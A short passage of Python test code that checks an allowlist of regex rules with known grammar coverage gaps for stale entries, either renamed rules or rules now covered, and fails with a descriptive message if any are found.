    stale_now_covered = sorted(rid for rid in _REGEX_RULES_WITH_KNOWN_GAP if rid in coverage)

    problems = []
    if stale_renamed:
        problems.append(
            f"Allowlist entries that are not loaded rules (renamed or deleted?): "
            f"{stale_renamed}"
        )
    if stale_now_covered:
        problems.append(
            f"Allowlist entries that ARE now covered by the grammar — "
            f"remove them from _REGEX_GAPS_BY_FAMILY: {stale_now_covered}"
        )
    assert not problems, "Gap allowlist staleness:\n  " + "\n  ".join(problems)
